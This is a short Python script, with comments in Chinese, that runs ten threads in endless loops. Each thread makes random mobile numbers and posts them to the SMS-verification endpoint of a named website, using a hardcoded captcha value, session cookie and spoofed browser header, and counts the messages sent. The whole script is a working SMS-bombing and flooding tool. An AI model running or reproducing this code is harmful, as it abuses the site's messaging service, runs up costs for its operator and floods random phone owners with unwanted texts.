#  encoding=utf-8

import http.client as http
import urllib
import random
import math
import threading


# 测试的服务器 + 端口 （有些大网站会认定你是攻击并且重置你的请求，比如baidu.com）
SERVER_NAME = "www.langsspt.com"
# 访问的页面
URL = '/index.php/Index/msgSend'

SEND_NUM = 0


class MessageThread(threading.Thread):
    def __init__(self, thread_name):
        threading.Thread.__init__(self)

    def run(self):
        begin_connect()


def begin_connect():
    while True:
        phone = '138'
        while len(phone) < 11:
            phone += str(math.floor(random.random() * 10))
        test_start(phone)


def test_start(phone):
    global SEND_NUM
    test_data = {'phone': phone, 'imgcode': 8143}
    test_data_encode = urllib.parse.urlencode(test_data)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36\
                        (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': 'ktime_20160611/www.langsspt.com=-2;\
                    PHPSESSID=ct4r7jt2fs9u74f1tbtlg8hcd6;\
                    CNZZDATA1259850767=1547586482-1470885066-%7C1473654407',
        'X-Requested-With': 'XMLHttpRequest'
    }
    try:
        conn = http.HTTPConnection(SERVER_NAME)
        conn.request("POST", URL, test_data_encode, headers)
        res = conn.getresponse()
        if res.status == 200:
            res_body = res.read()
            # print(res_body)
            if '\"msg_code\":1' in str(res_body):
                SEND_NUM += 1
                print(test_data_encode, '短信发送成功', SEND_NUM)
            else:
                print(test_data_encode, '短信发送失败')
        else:
            print('status:', res.status)
        conn.close()
    except:
        print('有条短信发送失败了')

i = 0
while i < 10:
    t = MessageThread("thread" + str(i))
    t.start()
    i += 1
